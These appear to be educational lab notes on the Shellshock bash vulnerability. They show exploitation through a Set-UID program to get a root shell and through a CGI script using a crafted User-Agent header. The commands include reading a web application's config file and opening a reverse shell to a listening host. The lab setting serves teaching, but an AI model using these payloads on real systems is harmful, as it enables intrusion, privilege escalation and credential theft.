# Shellshock Attack

Some snippets below:

## Shell Functions

```bash
foo() { echo "Inside function"; }
declare -f foo # show the function def
foo
unset -f foo
declare -f foo # show the function def
```

```bash
foo() { echo "hello world"; }
declare -f foo # show the function def
foo
export -f foo
bash
foo
```

```bash
foo='() { echo "hello world"; }'
echo $foo
declare -f foo # show the function def
export foo
bash_shellshock # run vuln. version of bash

echo $foo
declare -f foo # show the function def
foo
```

## The Shellshock Vuln.

```bash
foo='() { echo "hello world"; }; echo "extra";'
echo $foo
export foo
bash_shellshock # run vuln. version of bash

echo $foo
declare -f foo # show the function def
foo
```

## Shellshock Attack on Set-UID Programs

```bash
sudo ln -sf /bin/bash_shellshock /bin/sh # link sh to the vuln. version of bash
cat vul.c
gcc vul.c -o vul
./vul
sudo chown root vul
sudo chmod 4755 vul
./vul
export foo='() { echo "hello world"; }; echo /bin/sh'
./vul # get the root shell! 
sudo ln -sf /bin/dash /bin/sh # reset sh
```

## Shellshock Attacks on CGI Programs

### Setup

Put this script (`test.cgi`) in `/usr/bin/cgi-bin/`

```bash
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo 
echo 
echo "Hello World"
```

Use `curl` to interact with the CGI script

```bash
curl http://10.0.2.69/cgi-bin/test.cgi
```

### User Data in CGI Scripts

```bash
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo 
echo "*** Environment Variables ***"
strings /proc/$$/environ
```

```bash
curl -v http://10.0.2.69/cgi-bin/test.cgi
```

Use `curl -A ...` to change the user-agent field.

```bash
curl -A "test" -v http://10.0.2.69/cgi-bin/test.cgi
```

### Launching the attack

```bash
curl -A "() { echo hello; }; 
         echo Content-type: text/plain; 
         echo; /bin/ls -l"
         http://10.0.2.69/cgi-bin/test.cgi
```

```bash
curl -A "() { echo hello; }; 
         echo Content-type: text/plain; 
         echo; 
         /bin/cat /var/www/CSRF/Elgg/elgg-config/settings.php"
         http://10.0.2.69/cgi-bin/test.cgi
```

### Reverse Shell

```bash
nc -lv 9090
ifconfig
```

```bash
/bin/bash -i > /dev/tcp/10.0.2.70/9090 0<&1 2>&1
```

```bash
curl -A "() { echo hello; }; 
         echo Content-type: text/plain; 
         echo; 
         echo; 
         /bin/bash -i > /dev/tcp/10.0.2.70/9090 0<&1 2>&1"
         http://10.0.2.69/cgi-bin/test.cgi
```

```bash
nc -lv 9090
id
```
